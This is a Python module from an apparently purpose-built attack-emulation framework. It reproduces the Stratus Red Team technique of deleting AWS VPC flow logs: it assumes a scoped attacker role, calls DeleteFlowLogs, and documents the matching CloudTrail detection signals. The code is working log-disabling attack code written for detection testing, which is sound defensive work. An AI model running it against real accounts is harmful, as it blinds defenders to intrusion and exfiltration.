"""
Technique : aws.defense-evasion.vpc-remove-flow-logs
Tactic    : Defense Evasion (T1685.002 - Disable or Modify Tools: Disable or Modify Cloud Log)
Source    : https://stratus-red-team.cloud/attack-techniques/AWS/aws.defense-evasion.vpc-remove-flow-logs/

How the attack works:
  An attacker with ec2:DeleteFlowLogs removes a VPC's flow log configuration to
  eliminate network traffic visibility, blinding detection of lateral movement,
  data exfiltration, and C2 traffic.

Detection signal:
  - ec2:DeleteFlowLogs in CloudTrail. Removal of network visibility is a
    high-confidence defense evasion indicator.

Revert:
  - Not reversible from the attack. `pulumi up` recreates the flow log; the
    Pulumi refresh on the next deploy restores state.

Credential model:
  Option B. The technique is destructive, so the attack assumes the scoped
  attacker role created by infra/ (ec2:DeleteFlowLogs + ec2:DescribeFlowLogs
  only) instead of acting as the tenant's cross-account role.

Backend contract:
  run(outputs: dict, region: str = "us-east-1") -> None
  Reads `flow_log_id`, `vpc_id` and `attacker_role_arn` from the stack outputs.
"""

import sys
if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]
if hasattr(sys.stderr, "reconfigure"):
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")  # type: ignore[union-attr]

import time

import boto3
from botocore.exceptions import ClientError


def _bootstrap_session(outputs: dict, region: str):
    """Session for the attack. In the MayaTrail backend the worker injects the
    tenant's short-lived assumed-role credentials as outputs['_aws_credentials'];
    use them so the attack runs in the tenant account. Falls back to the ambient
    default session for standalone runs."""
    creds = (outputs or {}).get("_aws_credentials")
    if creds:
        return boto3.Session(
            aws_access_key_id=creds.get("AWS_ACCESS_KEY_ID"),
            aws_secret_access_key=creds.get("AWS_SECRET_ACCESS_KEY"),
            aws_session_token=creds.get("AWS_SESSION_TOKEN"),
            region_name=region,
        )
    return boto3.Session(region_name=region)


def _assume_role_with_retry(sts_client, role_arn, session_name, duration=3600, max_attempts=5):
    """
    AssumeRole with propagation retry.

    A freshly created IAM role and its inline policy take a few seconds to become
    consistent; sts:AssumeRole can return AccessDenied during that window.
    """
    retryable = {"AccessDenied", "InvalidClientTokenId", "AuthFailure"}
    last_exc = None
    for attempt in range(1, max_attempts + 1):
        try:
            return sts_client.assume_role(
                RoleArn=role_arn,
                RoleSessionName=session_name,
                DurationSeconds=duration,
            )
        except ClientError as exc:
            code = exc.response["Error"]["Code"]
            if code in retryable and attempt < max_attempts:
                print(f"  [~] AssumeRole attempt {attempt}/{max_attempts} got {code}, retrying in 5s")
                time.sleep(5)
                last_exc = exc
            else:
                raise
    raise RuntimeError(f"AssumeRole failed after {max_attempts} attempts: {last_exc}")


def _attacker_session(outputs: dict, region: str, session_name: str):
    """
    Build the session the technique runs as.

    The tenant credentials injected by the worker are used only to assume the
    scoped attacker role this emulation's infra creates. The destructive call is
    then made by that role, so IAM bounds the blast radius rather than the
    correctness of this script.
    """
    role_arn = (outputs or {}).get("attacker_role_arn", "")
    if not role_arn:
        raise RuntimeError("Missing required Pulumi output: attacker_role_arn")

    sts = _bootstrap_session(outputs, region).client("sts")
    creds = _assume_role_with_retry(sts, role_arn, session_name)["Credentials"]
    print(f"  [+] Assumed scoped attacker role: {role_arn}")
    print("  [!] CloudTrail event: sts:AssumeRole")
    return boto3.Session(
        aws_access_key_id=creds["AccessKeyId"],
        aws_secret_access_key=creds["SecretAccessKey"],
        aws_session_token=creds["SessionToken"],
        region_name=region,
    )


def banner(msg: str) -> None:
    print(f"\n{'=' * 60}\n  {msg}\n{'=' * 60}")


def run(outputs: dict, region: str = "us-east-1") -> None:
    flow_log_id = (outputs or {}).get("flow_log_id", "")
    vpc_id = (outputs or {}).get("vpc_id", "")
    if not flow_log_id:
        raise RuntimeError("Missing required Pulumi output: flow_log_id")

    banner("Step 0 - Assume the scoped attacker role (AssumeRole)")
    session = _attacker_session(outputs, region, "atomic-t1685002-flowlogs")
    ec2_client = session.client("ec2", region_name=region)

    # ── Step 1: Delete the VPC flow log ─────────────────────────────────────
    banner("Step 1 - Delete VPC flow log (DeleteFlowLogs)")
    try:
        response = ec2_client.delete_flow_logs(FlowLogIds=[flow_log_id])
        unsuccessful = response.get("Unsuccessful", [])
        if unsuccessful:
            for item in unsuccessful:
                print(f"  [!] Failed to delete {item.get('ResourceId')}: "
                      f"{item.get('Error', {}).get('Message')}")
            raise RuntimeError(f"DeleteFlowLogs reported failures: {unsuccessful}")
        print(f"  [+] Flow log deleted: {flow_log_id}")
        print(f"  [+] VPC: {vpc_id}")
        print("  [!] CloudTrail event: ec2:DeleteFlowLogs")
        print("  [!] Network traffic logging is now DISABLED for this VPC.")
    except ClientError as exc:
        print(f"  [!] DeleteFlowLogs failed: {exc}")
        raise

    banner("Complete")
    print("CloudTrail events generated: sts:AssumeRole, ec2:DeleteFlowLogs")
